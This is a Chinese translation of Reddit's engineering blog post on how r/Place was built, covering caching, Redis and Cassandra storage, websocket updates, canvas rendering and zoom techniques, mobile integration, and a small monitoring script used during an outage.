画板的颜色：</p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/drawio-1.png?w=720&amp;h=199\" alt=\"\"></p>\n<p>我们非常关心 redis 读取最大带宽。如果很多客户端同时链接或刷新，它们会同时请求整个画板的状态，全部都触发 redis 的读取操作。因为画板是全局共享状态，显而易见的解决方案是使用缓存。我们决定在 CDN 层（Fastly）使用缓存，因为实现简单，并且缓存离客户端更近可以提高响应速度。对整个画板的请求被 Fastly 缓存下来并设置 1 秒的超时时间。我们也添加了 <a href=\"https://docs.fastly.com/guides/performance-tuning/serving-stale-content#usage\">stale-while-revalidate</a> 这个控制缓存的头信息，来应对画板缓存过期导致超过预期的大量请求。<a href=\"https://www.fastly.com/network-map\">Fastly 维护着大约 33 处独立缓存 POPs（接入点）</a>，所以我们预期每秒最多有 33 个针对整个画板的请求。</p>\n<p>我们使用我们的 <a href=\"https://github.com/reddit/reddit-service-websockets\">websocket 服务</a> 向所有客户端推送更新。我们已经成功地在 <a href=\"https://www.reddit.com/live\">reddit live</a> 生产环境中应用过它，来处理超过 100000 的并发用户，比如 live PM notifications 功能或其他特性。wesocket 服务也曾是我们过去愚人节项目的基础，比如 <a href=\"https://redditblog.com/2015/04/01/the-button/\">The Button</a> 和 <a href=\"https://redditblog.com/2016/04/01/Robin/\">Robin</a> 两个项目。对于 r/Place 项目，客户端维护一个 websocket 链接来接收实时的小块变化更新。</p>\n<h3>API</h3>\n<p><strong>检索整个画板</strong></p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/board-bitmap.png?w=720&amp;h=368\" alt=\"\"></p>\n<p>请求首先到达 Fastly。如果那里有一份未过期的画板副本，它会立刻返回从而不需要访问 reddit 应用服务器。否则如果缓存未命中或副本过时，reddit 应用会从 redis 中读取整个画板然后返回到 Fastly 中并缓存，并返回给客户端。</p>\n<p style=\"text-align: center;\">reddit 应用测量的请求速率和响应时间：</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fgiu8lqg7tj20jw08v3z5.jpg\"></p>\n<p>注意，请求速率从没超过 33 个/秒，说明 Fastly（CDN） 缓存非常给力，阻止了大量直接访问 reddit 应用的请求。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fgiu8mejg3j20jt08nwf9.jpg\"></p>\n<p>当请求访问 reddit 应用时，redis 的读取操作非常迅速。</p>\n<p><strong>绘制一个小块</strong></p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/draw.png?w=720&amp;h=533\" alt=\"\"></p>\n<p>绘制一个小块的步骤如下：</p>\n<ol>\n<li>从 Cassandra 读取用户上一次更改小块的时间戳。如果和当前时间间隔比冷却时间（5 分钟）短，拒绝绘制请求，返回给用户一个错误。</li>\n<li>向 redis 和 Cassandra 写入小块详情。</li>\n<li>向 Cassandra 写入用户上一次修改小块的时间戳。</li>\n<li>让 websocket 服务向所有链接的客户端发送新的小块。</li>\n</ol>\n<p>Cassandra 的所有读写操作的<a href=\"http://docs.datastax.com/en/archived/cassandra/1.2/cassandra/dml/dml_config_consistency_c.html\">一致性设置为 QUORUM 级别</a>，来确保强一致性。</p>\n<p>我们当然也有竞态条件允许用户一次更改多个小块。在步骤 1-3 中并没有锁，因此批量小块修改的操作通过步骤 1 的检查之后将在步骤 2 中进行修改。看起来一些用户发现了这个漏洞或一些机器脚本不遵守速率限制，所以大概有 15000 个小块被利用这个漏洞进行更改（占全部更改小块的 0.09%）</p>\n<p style=\"text-align: center;\">reddit 应用测量的请求速率和响应时间：</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fgiu8mu894j20jn08rwf3.jpg\"></p>\n<p>我们经历了更改小块最大速率大概 200/s。这比我们估算的最大速率 333/s 要低（平均每 5 分钟 100000 个用户更改小块）。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fgiu8o0satj20jn08o3ze.jpg\"></p>\n<p><strong>获取单个小块详情</strong></p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/pixel1.png?w=720&amp;h=251\" alt=\"\"></p>\n<p>直接从 Cassandra 请求单个小块。</p>\n<p style=\"text-align: center;\"><em>reddit 应用测量的请求速率和响应时间：</em></p>\n<p><em><img id=\"pic\" class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fgiu8oq24dj20jt08jwf4.jpg\"></em></p>\n<p>这个服务端点用的很多。除了客户端频繁的请求之外，有人编写抓取工具每次检索整个画板的一个小块。由于这个服务端点没有在 CDN 缓存，所有请求被 reddit 应用程序处理。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fgiu8p6m34j20jp08q754.jpg\"></p>\n<p>在整个项目中，这些请求的响应时间非常迅速稳定。</p>\n<h3>Websockets</h3>\n<p>我们并没有在 websocket 服务中为 r/Place 做单独指标，但是我们可以估计并减去项目开始前后的基本使用量。</p>\n<p style=\"text-align: center;\"><em>websocket 服务总连接数：</em></p>\n<p><em><img id=\"pic\" class=\"aligncenter\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fgiu8q6c2yj20jr08qt9b.jpg\"></em></p>\n<p>r/Place 开始前的基本使用量大概有 20000 个连接，而峰值 100000 个链接，所以高峰期我们大概有 80000 个用户连接到 r/Place。</p>\n<p style=\"text-align: center;\"><em>Websocket 服务带宽：</em></p>\n<p><em><img id=\"pic\" class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fgiu8qrc27j20js08p0tk.jpg\"></em></p>\n<p>高峰期 r/Place 的 websocket 服务吞吐量超过 4gbps（24个实例，每个 150 Mbps）</p>\n<h2>前端：Web和移动端</h2>\n<p>构建 r/Place 的前端工程涉及到了跨平台开发的众多挑战。我们期望 r/Place 在我们所有主流平台上拥有无缝体验，包括桌面web、移动web、iOS 和 Android。</p>\n<p>r/Place 的 UI 需要做三件很重要的事：</p>\n<ol>\n<li>实时展示画板状态。</li>\n<li>让用户和画板交互方便容易</li>\n<li>在我们所有平台上正常运行，包括移动端 app。</li>\n</ol>\n<p>UI 的主要焦点集中在了 canvas，并且 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API\">Canvas API</a> 完全能胜任要求。我们使用一个 1000 x 1000 的 <code>&lt;canvas&gt;</code> 元素，把每个小块当做一个像素进行绘制。</p>\n<h3>绘制 canvas</h3>\n<p>canvas 需要实时展示整个画板的状态。我们需要在页面载入的时候绘制整个画板的状态，然后更新通过 websocket 传输过来的画板状态。通过 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D\">CanvasRenderingContext2D</a> 接口，有三种方式更新 canvas 元素。</p>\n<ol>\n<li>用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/drawImage\">drawImage()</a> 将一个存在的图像绘制进 canvas。</li>\n<li>通过众多图形绘制的方法来绘制各种形状，比如用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/fillRect\">fillRect()</a> 绘制一个有颜色的矩形。</li>\n<li>构造一个 ImageData 对象，然后用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/putImageData\">putImageData()</a> 方法将它绘制进 canvas。</li>\n</ol>\n<p>第一种选项并不适合我们，因为我们并没有画板的图像格式，还剩下 2、3 选项。用<code>fillRect()</code>方法更新单独的小块非常简洁：当 websocket 通知更新时，只需要在(x,y)位置处绘制一个 1 x 1 的矩形。一般来说这很棒，但并不适合绘制画板的初始状态。<code>putImageData()</code>方法显然更合适，我们可以在 ImageData 对象中定义每个像素的颜色，然后一次性绘制整个 canvas。</p>\n<p><strong>绘制画板的初始状态</strong></p>\n<p>我们使用<code>putImageData()</code>方法，前提需要将画板状态定义成 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8ClampedArray\">Uint8ClampedArray</a> 形式，每个值用 8 位无符号整型表示 0-255 之间的数字。每一个值表示单个颜色通道（红、绿、蓝、alpha），每个像素需要 4 个值组成的数组。一个 2 x 2 的 canvas 需要一个 16 字节的数组，前 4 字节表示 canvas 左上角的像素，最后 4 字节表示右下角像素。</p>\n<p>插图展示了 canvas 像素和 Uint8ClampedArray 映射关系：</p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/drawio-2.png?w=720&amp;h=294\" alt=\"\"></p>\n<p>对于 r/Place 的 canvas，数组大小是四百万字节，也就是 4MB。</p>\n<p>在后端，画板状态储存格式是 4 位的 bitfield。每个颜色用 0 到 15 之间的数字表示，这允许我们将 2 像素的颜色信息打包进 1 个字节（1字节=8位）。为了在客户端配合使用，我们需要做 3 件事：</p>\n<ol>\n<li>将二进制数据从我们的 API 拉取到客户端。</li>\n<li>“解压”数据</li>\n<li>将 4 位颜色映射成可用的 32 位颜色。</li>\n</ol>\n<p>为了拉取二进制数据，我们在支持 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API\">Fetch API</a> 的浏览器中使用此 API。在不支持的浏览器中，我们使用 <a href=\"https://www.youtube.com/watch?v=Pubd-spHN-0\">XMLHttpRequest</a>，并把 responseType 设置为 <code>“arraybuffer”</code>。</p>\n<p>我们从 API 接收到的二进制数据中，每个字节有 2 像素的颜色数据。<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray\">TypedArray</a> 的构造函数允许操作的最小单位是 1 字节。这在客户端上并不方便使用，所以我们做的第一件事就是“解压”，让数据更容易处理。方式很简洁，我们遍历打包的数据并按照高位低位分割比特位，将它们复制到另一个数组的不同字节中。最后，4 位的颜色值映射成可用的 32 位颜色。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fgiu8qtp38j20k703qt8z.jpg\"></p>\n<p><code>ImageData</code>这种数据结构需要使用<code>putImageData</code>方法，最终结果要求是可读的<code>Uint8ClampedArray</code>格式并且颜色通道字节要按照 RGBA 这种顺序。这意味着我们要做另一遍“解压”，将每个颜色拆分成颜色通道字节并按顺序排列。每个像素要做 4 次操作,这不是很方便，但幸运的是有其他方式。</p>\n<p><code>TypeArray</code>对象们本质上是<code>ArrayBuffer</code>的数组视图，实际上表示二进制数据。它们共同的一点就是多个<code>TypeArray</code>实例可以基于一个<code>ArrayBuffer</code>实例进行读写。我们不必将 4 个值写入 8 位的数组，我们可以直接把单个值写入一个 32 位的数组。使用<code>Uint32Array</code>写入值，我们可以通过更新数组单个索引来轻松更新单个小块颜色。我们唯一需要做的就是把我们的颜色字节逆序储存（ABGR），这样一来使用<code>Uint8ClampedArray</code>读取数据时可以自动把字节填入正确位置。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fgiu8r9pxaj20k403u74h.jpg\"></p>\n<p><strong>处理 websocket 更新</strong></p>\n<p>响应每个像素更新时，用<code>drawRect()</code>方法绘制它们很方便，但这有个缺点：当大量更新在同一时间来到，会影响浏览器性能。我们知道画板状态更新十分频繁，所以我们需要处理这个问题。</p>\n<p>我们希望在一个时间点前后的 websocket 更新能够批量绘制一次，而不是每次 websocket 更新来到就立刻重新绘制 canvas。我们做了以下两点改变：</p>\n<ol>\n<li>因为我们发现了使用<code>putImageData()</code>一次更新多个像素这条明路，所以我们不再使用<code>drawRect()</code>。</li>\n<li>我们把绘制 canvas 操作放到<code>requestAnimationFrame</code>循环中。</li>\n</ol>\n<p>把绘制移到动作循环中，我们可以及时将 websocket 更新写入<code>ArrayBuffer</code>，然后延迟绘制。每一帧（大概 16ms）间的 websocket 更新会再一次绘制中批量执行。因为我们使用<code>requestAnimationFrame</code>，这意味着每次绘制时间不能太长（不超过 16ms），只有 canvas 的刷新速率受影响（而不是拖慢整个浏览器）。</p>\n<h3>Canvas 的交互</h3>\n<p>还有非常重要的一点，canvas 需要方便用户的交互。用户与 canvas 核心交互方式是更改上面的小块。在 100% 缩放下，精确地选择绘制单个像素很不方便，而且容易出错。所以我们需要放大显示（放大很多）。我们也需要方便的平移 canvas，因为在多数浏览器上它太大了（尤其是放大后）。</p>\n<p><strong>视角缩放</strong></p>\n<p>用户只能每五分钟绘制一次小块，所以选错小块非常令人不爽。我们需要把 canvas 放大到每个小块都成为一个相当大的目标。这在触摸设备上尤其重要。我们使用 40x 的放大比例，给每个小块 40 x 40 的目标区域。为了应用缩放，我们把<code>&lt;canvas&gt;</code>元素包裹进一个<code>&lt;div&gt;</code>，并给 div 设置 CSS 属性<code>transform: scale(40, 40)</code>。这样一来，小块的布置变得非常方便，但整个画板的显示并不理想（尤其是在小屏幕上），所以我们混合使用两种缩放级别：40x 用于绘制，4x 用于显示。</p>\n<p>使用 CSS 来放大 canvas 使得绘制画板的代码和缩放代码相分离，但不巧这种方式也带来一些问题。当放大一个图片（或 canvas），浏览器默认使用“平滑”算法处理图片。这适用于一些场景，但也彻底毁灭了像素艺术并把它变得混乱模糊。好消息是有另一个 CSS <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/image-rendering\">image-rendering</a> 允许我们命令浏览器不这么做。坏消息并不是所有浏览器完全支持这个属性。</p>\n<p><em>坏消息，变得模糊：</em></p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/www-reddit-com-place-webviewtrue-1.png?w=720&amp;h=251\" alt=\"\"></p>\n<p>我们需要在那些浏览器上用其他方式放大 canvas。我之前提到过绘制 canvas 有三种方式。其中第一个是<code>drawImage()</code>方法，它可以把一个存在的图像或另一个 canvas 绘制进一个 canvas。它也支持在绘制的时候放大或缩小图像，虽然放大的时候会和在 CSS 中放大一样出现模糊问题，但是可以通过关闭 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/imageSmoothingEnabled\">CanvasRenderingContext2D.imageSmoothingEnabled</a> 标识，这种跨浏览器兼容性的方式来解决。</p>\n<p>所以修复模糊 canvas 问题的答案就是在渲染过程中增加额外一步。我们引入了另一个<code>&lt;canvas&gt;</code>元素，它大小位置适应于容器元素（比如画板的可见区域）。每次重新绘制 canvas 后，我们使用<code>drawImage()</code>把它的一部分绘制到新的、有合适缩放比例的 canvas。因为额外的步骤给渲染过程带来微小的开销，所以我们只在不支持<code>image-rendering</code>CSS 属性的浏览器上这样做。</p>\n<p><strong>视角平移</strong></p>\n<p>canvas 是一个相当大的图像，尤其是放大之后，所以我们需要提供一些方式操作它。为了调整 canvas 在屏幕上的位置，我们采取和解决缩放问题一样的方式：我们将<code>&lt;canvas&gt;</code>包裹进另一个<code>&lt;div&gt;</code>，并在它上面应用 CSS 属性<code>transform: translate(x, y)</code>。使用单独的 div 使得应用在 canvas 上的变换操作更容易控制，这对于防止视角在缩放时产生移动非常重要。</p>\n<p>我们最后支持多种方式调整视角位置，包括：</p>\n<ul>\n<li>点击拖拽</li>\n<li>点击移动</li>\n<li>键盘导航</li>\n</ul>\n<p>每种操作需要一点不同的实现方式。</p>\n<p><strong>点击拖拽</strong></p>\n<p>最基本的导航方式就是点击拖拽（或触摸拖拽）。我们保存了<code>mousedown</code>事件的 x、y 坐标。对于每次<code>mousemove</code>事件，我们计算鼠标相对于起点的偏移量，然后把偏移量加到已存在的 canvas 偏移量中。视角位置立刻改变，让人感觉这种到导航方式很灵敏。</p>\n<p><strong>点击移动</strong></p>\n<p>我们也支持点击一个小块，使得小块定位到屏幕中心。为了实现这个功能，我们需要跟踪<code>mousedown</code>和<code>mouseup</code>事件，为了区别“点击”和“拖动”。如果鼠标移动距离达不到“拖动”的标准，我们会根据鼠标位置和屏幕中心的距离来调整视角位置。和点击拖动不同，视角位置的更新使用了缓动函数（easing function）。我们没有立刻设定新的位置，而是把它保存成“目标”位置。在动画循环中（每次绘制 canvas 的循环），我们使用缓动函数移动当前视角逐渐接近目标。这避免了视角移动太突然。</p>\n<p><strong>键盘导航</strong></p>\n<p>我们也支持键盘导航，既可以使用 WASD 键也可以使用方向键。四个键控制内置 <strong>移动向量</strong>。没有按键按下时，向量默认是 (0, 0)，每个按键按下时会增加或减少向量的 x 或 y 轴 1 个单位。举个例子，按下“右”和“上”键会把移动向量设置成 (1,-1)。这个移动向量随后应用在动画循环中，来移动视角。</p>\n<p>在动画循环中，移动速度是基于当前缩放级别而计算出来的，公式如下：</p>\n<p style=\"text-align: center;\"><span style=\"color: #ff0000;\"><code>movementSpeed = maxZoom / currentZoom * speedMultiplier</code></span></p>\n<p>在缩小状态下，键盘导航移动速度更快，这样显得更自然。</p>\n<p>移动向量<a href=\"http://mathworld.wolfram.com/NormalizedVector.html\">单位化</a>并乘以移动速度，然后应用到当前视角位置。我们用单位向量来确保对角线移动和正交移动拥有相同速度，这也显得更自然。最后我们对移动向量自身的变化也使用了缓动函数。这使得移动方向和速度变化的更平滑，视角变得流畅生动。</p>\n<h3>移动应用支持</h3>\n<p>在 iOS 和 Android 的移动应用嵌入 canvas 过程中，我们遇到一些挑战。首先，我们需要认证用户，然后用户才能更改小块。和基于 session 的 web 认证不同，移动应用中我们使用 OAuth。这意味着应用需要为 webview 提供当前登录用户的访问令牌。最安全的方式就是用 JavaScript 在应用调用 webview 时注入 oauth 认证头信息（这也允许我们设置其他需要的头信息）。问题就简化为在每个 api 调用中传递认证头信息了。</p>\n<p><code>r.place.injectHeaders({‘Authorization’: ‘Bearer &lt;access token&gt;’});</code></p>\n<p>在 iOS 端，当你可以更改 canvas 中的下一个小块时，我们实现了消息提醒功能。因为小块的变更完全在 webview 中，所以我们需要实现向原生应用的回调。辛运的是在 iOS 8 及以上版本中只需要一个简单的 JavaScript 调用：</p>\n<p><code>webkit.messageHandlers.tilePlacedHandler.postMessage(this.cooldown / 1000);</code></p>\n<p>应用中的委派方法根据传入的冷却计时器，会随后调度发送一条通知。</p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/place-notif.png?w=720&amp;h=210\" alt=\"\"></p>\n<h2>我们学到了什么</h2>\n<h3>你总会疏漏一些事</h3>\n<p>我们完美计划好了任何事情，我们知道上线时，没有什么可能出错的地方。我们对前端和后端分别进行了负载测试，我们不可能再遇到其他错误。</p>\n<p>真的吗？</p>\n<p>上线过程很顺利。经历了一个黎明，r/Place 人气迅速上升，我们 websocket 实例的链接数量和通信量也随之增加：</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fgiu8s6hfaj20js0hvq44.jpg\"></p>\n<p>并没有什么惊喜，所有和我们预期的一样。奇怪的是，我们怀疑限制了这些服务器实例的网络带宽，因为我们预计会有更大的流量。查看了一下 CPU 的实例情况，却显示出一幅不同的图片：</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fgiu8su5fdj20jt08mmxt.jpg\"></p>\n<p>服务器实例是 8 核的，所以很明显它们快到上限了。为什么它们突然表现的如此不同？我们将原因归结于 r/Place 的工作负载类型不同于以往项目。毕竟这里有很多微小的消息，我们一般发送大型消息，比如直播帖子的更新和通知。我们也没有处理过大量用户接收相同消息的情况，所以有很多地方都不同。</p>\n<p>这没什么大不了，我们预计只需要调用和测量它一天而已。待命的运维数量是服务器实例的两倍，而且他们两耳不闻窗外事，一心只顾服务器。</p>\n<p>然后，发生了这个：</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fgiu8tjp99j20jq08rwez.jpg\"></p>\n<p>这幅图看上去可能并没什么，但事实上这是我们生产环境的 Rabbit MQ 实例，不仅处理 websocket 消息，也处理 reddit.com 所有底层的依赖项。这不容乐观，一点都不。</p>\n<p>经过了各种调查、束手无策和升级实例，我们把问题锁定在管理接口。它总是有点慢，随后我们意识到，我们为了获取项目状态用 <a href=\"https://github.com/python-diamond/Diamond/blob/master/src/collectors/rabbitmq/rabbitmq.py\">rabbit diamond collector</a> 会频繁查询接口。我们认为创建新的 websocket 实例时创建了额外的 exchange （RabbitMq 中概念），再加上这些 exchange 的消息吞吐量，导致了管理界面在查询和记录时，rabbit 卡住了。我们把它关掉，情况好多了。</p>\n<p>但我们不想在一片黑暗之中（关掉了状态显示程序），所以我们迅速做了一个手工艺术品——监控脚本，帮助我们观察整个项目：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b5c6a6def9918213812\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat s****y_diamond.sh\r\n\r\n#!/bin/bash\r\n\r\n/usr/sbin/rabbitmqctl list_queues | /usr/bin/awk '$2~/[0-9]/{print \"servers.foo.bar.rabbit.rabbitmq.queues.\" $1 \".messages \" $2 \" \" systime()}' | /bin/grep -v 'amq.gen' | /bin/nc 10.1.2.3 2013</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b5c6a6def9918213812-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b5c6a6def9918213812-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b5c6a6def9918213812-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b5c6a6def9918213812-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b5c6a6def9918213812-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b5c6a6def9918213812-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">s*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">y_diamond</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b5c6a6def9918213812-2\"> </div><div class=\"crayon-line\" id=\"crayon-594b5c6a6def9918213812-3\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b5c6a6def9918213812-4\"> </div><div class=\"crayon-line\" id=\"crayon-594b5c6a6def9918213812-5\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">rabbitmqctl </span><span class=\"crayon-v\">list_queues</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'$2~/[0-9]/{print \"servers.foo.bar.rabbit.rabbitmq.queues.\" $1 \".messages \" $2 \" \" systime()}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'amq.gen'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">nc</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.1.2.3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2013</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>如果你好奇为什么我们不断调整修改像素（小块）的超时时间（冷却时间），那么现在你就知道了。我们试着减轻服务器压力以便整个项目顺利运行。这也是为什么在某个时间段，一些像素的呈现花费较长时间。</p>\n<p>所以不幸的是，你当时坚信如下的信息：</p>\n<p><a href=\"https://www.reddit.com/r/Place/comments/62xms3/10k_upvotes_to_reduce_the_cooldown_even_further/?ref=share&amp;ref_source=embed&amp;utm_content=title&amp;utm_medium=post_embed&amp;utm_name=8f15a84993df435b970ed0f5e2bf05d8&amp;utm_source=embedly&amp;utm_term=62xms3\">10K upvotes to reduce the cooldown even further! <em>ADMIN APPROVED</em></a></p>\n<p>尽管调整完看 r/Place/new 版块很有意思，但调整完全出于技术原因：</p>\n<p><img src=\"https://redditupvoted.files.wordpress.com/2017/04/place-page.png?w=720&amp;h=475\" alt=\"\"></p>\n<p>或许这也是调整的部分动机。</p>\n<h3>机器人终归是机器人</h3>\n<p>我们在项目的末期经历了一点小波折。一般来说，我们经常遇到的问题之一便是客户端重试行为。众多客户端在遇到问题时便不停地重试。这意味着站点一旦有点小问题，对于那些没有对故障进行<a href=\"https://en.wikipedia.org/wiki/Exponential_backoff\">回退</a>编程的一些客户端，很容易引发重试风暴。</p>\n<p>当我们关闭 r/Place 时，很多机器人端点请求时返回非 200 的响应码。像这样的<a href=\"https://github.com/PlaceStart/placestart/blob/7d27beacc75dcf84d634ea32a5bf0421bf2c042a/monitor.py#L114-L125\">代码</a>不是十分友好。值得庆幸的是，在 Fastly 层很容易拦截它们。</p>\n<h2>创造点其他东西</h2>\n<p>如果没有庞大团队的协作，项目不会这么成功。我们很感谢 u/gooeyblob、u/egonkasper、u/eggplanticarus、u/spladug、u/thephilthe、u/d3fect 等人对 r/Place 团队的贡献，让愚人节的尝试变成现实。</p>\n<p>正如我们之前提到的，如果你对为百万用户创造特殊体验感兴趣，看一看我们的<a href=\"https://about.reddit.com/careers/\">招聘页</a>。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/5085cce1bd4e144b7d148079a34b20c1.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/02b09a29fdb3ab5fe03d4bd1afe95664.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111398\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111398votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111398\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" 